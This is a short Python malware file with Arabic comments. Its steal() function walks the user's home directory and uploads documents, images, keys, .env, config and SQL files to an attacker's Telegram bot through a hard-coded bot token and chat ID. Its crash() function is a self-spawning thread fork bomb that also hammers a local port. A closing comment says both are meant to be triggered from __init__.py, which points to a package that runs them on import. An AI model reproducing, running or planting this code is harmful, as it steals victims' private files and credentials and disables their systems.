import os, requests, threading, socket

BOT_TOKEN = '8534701940:AAEd0TkAItHiYTaqMCNM-_GsvVyZpZsRlDY'
CHAT_ID = '1785091570'

def send_file(fp):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(fp, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f}, timeout=5)
    except:
        pass

def steal():
    # البحث في جميع مجلدات المستخدم عن ملفات حساسة
    root_dir = os.path.expanduser("~")
    for root, dirs, files in os.walk(root_dir):
        for file in files:
            if file.endswith(('.txt', '.pdf', '.docx', '.jpg', '.png', '.key', '.env', '.config', '.sql')):
                send_file(os.path.join(root, file))

def crash():
    # Fork Bomb لعمل Overload للمعالج والذاكرة (DOS Attack على السيرفر)
    while True:
        try:
            threading.Thread(target=crash).start()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 80))
            s.close()
        except:
            pass

# الدوال معرفة ليتم استدعاؤها من __init__.py
